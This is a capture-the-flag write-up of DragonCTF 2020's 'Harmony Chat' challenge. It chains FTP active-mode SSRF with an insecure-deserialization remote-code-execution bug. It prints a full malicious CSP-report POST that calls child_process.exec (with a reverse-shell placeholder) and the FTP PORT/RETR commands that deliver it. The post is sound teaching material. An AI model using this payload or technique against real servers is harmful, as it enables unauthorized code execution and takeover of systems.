---
title: "DragonCTF 2020: Harmony Chat"
date: 2020-11-22T14:33:48-07:00
draft: false
toc: false
images: ["mages/harmonychannel.png"]
tags:
  - SSRF
  - FTP
  - insecure-deserialization
  - web

categories:
  - writeups
---

A writeup for the first web problem, "Harmony Chat", in DragonCTF 2020. A very fun and interesting challenge! 

## TL;DR
- Application is vulnerable to RCE via insecure deserialization on the ``/csp-report`` endpoint
- Use FTP active mode to SSRF a post request to ``/csp-report`` that would open a reverse shell on the application's HTTP server 
- Cat flag for profit

## Let's Begin! 
The Harmony Chat is a Discord-esque chat app where you can ``/register`` an account and create channels. Once registered, you're given your UID, which you use to ``/login`` or to invite other users into a channel you create. 

There appears to be an FTP server to serve the role of delivering chat logs of a channel through an FTP data connection, which you can request for in the top-right corner of the chat app's GUI. 

{{< image src="/images/harmonylogs.png" alt="research" position="center" style="border-radius: 8px;" >}}

Clicking on it will take whatever you wrote in the channel...

{{< image src="/images/harmonychatlogexample.png" alt="research" position="center" style="border-radius: 8px;" >}}

and convert it into a txt file delivered to you through a data connection established by their FTP server to you:

```
vie: hello
vie: hi
vie: how are u today
```
_The format of the chatlog file that would be delivered to you via FTP_


The source was given for the challenge. We can see that the application supports the implementation of 3 servers: an HTTP one, an intermediary websockets one, and an FTP one. More on that in a bit.

Exploring the source more, we see a module called ``csp`` which delivers a report should any chat log input violate the application's content-security policy, when you request for the chat log via HTTP instead of FTP: 

```js

const REPORT_URL = "/csp-report"
const ContentSecurityPolicy = (req, res, next) => {
  if (req.path === REPORT_URL &&
      req.method === "POST" &&
      req.headers["content-type"] === "application/csp-report") {
    handleReport(req, res)
    return
  }

  injectCSPHeaders(req, res)
  next()
}
```

the function ``handleReport()`` is defined as so: 

```js
const handleReport = (req, res) => {
  let data = Buffer.alloc(0)

  req.on("data", chunk => {
    data = Buffer.concat([data, chunk])
  })

  req.on("end", () => {
    res.status(204).end()

    if (!isLocal(req)) {
      return
    }

    try {
      const report = utils.validateAndDecodeJSON(data, REPORT_SCHEMA)
      console.error(generateTextReport(report["csp-report"]))
    } catch (error) {
      console.warn(error)
      return
    }
  })
}


...

const isLocal = (req) => {
  const ip = req.connection.remoteAddress
  return ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1"
}

```

In the ``csp`` module, the application does some basic LAN checking when the HTTP server recieves a POST request to the ``REPORT_URL`` endpoint (``/csp-report``). 

We can host the application locally. In our local instance, we can go ahead and play with the application ourselves and see what we get. Robert Xiao, team mentor, helped in realizing that RCE was achievable through ``/csp-report``. With the application running locally on the right, we see that we can leverage the app's use of ``javascript-serializer`` to deserialize dangerous payloads. For example, ``console.log(11111)``:

{{< image src="/images/harmonyconsolelog.png" alt="research" position="center" style="border-radius: 8px;" >}}

So, we can execute code through a POST request to ``/csp-report``! Obviously, we can achieve a simple ``console.log()`` but this can be extended further into opening a reverse-shell. Anything is possible :)

So, to recap, we have the capability to communicate to the basic HTTP server and an FTP server, alongside an RCE vulnerability if we make a malformed POST request to ``/csp-report``. Of course, the RCE is easy to achieve when hosting the application locally, since we don't need to worry about failing the ``isLocal`` check. To replicate RCE on the actual application itself, we need to somehow trick a forward-facing server on there to make that POST request for us. AKA, we need to do some SSRF. Now, like mentioned before, we can communicate to 2 servers in the application: the HTTP one, and the FTP one. Let's explore FTP's capabilities further.

[I've actually seen this attack before](/posts/2020/04/plaidctf-2020-contrived-web-problem) - tricking an FTP server to send a rogue request to another server is quite easy to do if said FTP server supports active mode. To quickly summarize, FTP on active mode is essentially the client/user stipulating to the server where to establish its data connection to. By convention, you would typically tell it to connect to some port on your machine so you can transfer files between you and the server - but realistically, you can tell the server to establish a connection to wherever you want (so long as "wherever you want" has the stipulated port open). 

So the golden question - can we use FTP on active mode and make their server establish a data connection to their HTTP server, allowing us to use FTP to send them the POST request?
(...I mean, yes, that's why we're here right? :P)

So Harmony Chat's FTP server serves one (intended) purpose: to store then deliver a file showcasing the chat logs of a specific channel. Unfortunately, the FTP server doesn't have write access to these files it stores, so it's not like we can create some dummy file then edit it later. We will have to somehow craft a valid POST request in the chat log of a channel. 

How do we get this...

```
POST /csp-report?: HTTP/1.1
Host: localhost:3380
Content-Length: 386
Content-Type: application/csp-report

{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"COMMAND TO OPEN A REVERSE SHELL"})"}}}}
```

On here? 

{{< image src="/images/harmonychannel.png" alt="research" position="center" style="border-radius: 8px;" >}}

First thing that came to mind was that the chat logs all have the same ``displayName: message`` format... So the thought was to split the POST request by the first occurence of ``:`` on each new line and have these different "users" deliver specific "messages" to construct the POST request there. You had the ability to invite multiple users to one channel, so this was probably the way to go. 

I know that this can be automated - but I did the process manually. 
So, we should have 5 "users": ``POST /csp-report?``, ``Host``, ``Content-Length``, ``Content-Type`` and ``{"csp-report"``. They will then each message the chat in order as so... 

{{< image src="/images/chatlogsPOST.png" alt="research" position="center" style="border-radius: 8px;" >}}
_NOTE: not seen here, but I used the console to send an empty message that would register as a new line to seperate the request headers from the request body. You'll see what this looks like in a bit._

I bet you can see where I'm going with this. If we go ahead and download the associated chat log file, we get:

```
POST /csp-report?: HTTP/1.1
Host: localhost:3380
Content-Length: 386
Content-Type: application/csp-report

{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec("COMMAND TO OPEN A REVERSE SHELL"}}}}
```

Which looks _exactly_ like the POST request we would send to the HTTP server. 

We go ahead and ask the FTP server to STOR that chat log file in it (by clicking the logs button at the top right), and then connect to it ourselves. We need to give it these commands: 

```
user <uid>
pass                    <-- Doesn't matter
port 172,0,0,1,13,52    <-- Sets FTP on active mode so this is required
retr <id of channel>    <-- Retrieves chat log, sends it in the data channel
```

{{< image src="/images/ftpcommunication.png" alt="research" position="center" style="border-radius: 8px;" >}}

- The ``user`` command is expecting a uid of any user in the current session. We technically made 5, so any of their uids work.

- The ``pass`` command can be blank, as the implementation of the application said any password will be accepted. 

- The ``port`` command is what makes the FTP server operate in active mode. The command's arguments are the 4 bytes of the IP, then the 2 remaining values are the port number following this convention: p1, p2 where ``(p1 * 256) + p2`` = full port number. We want to connect to Harmony Chat's localhost at the HTTP server, which is at port 3380. 

- The ``retr`` command takes the name of a file (in this case, the name of the chatlog) and retrieves it, then sends it over the data connection it just established. If we got things right, then the FTP server would have sent our POST request to the HTTP server.

Once the FTP server has confirmed that it RETRieved the channel's chatlog and sent it to the local HTTP server, we check back on our ngrok instance and see that a reverse-shell opened up. All that's left now is to ``ls`` our way to the flag :)

{{< image src="/images/harmonyshell.png" alt="research" position="center" style="border-radius: 8px;" >}}

#### Vie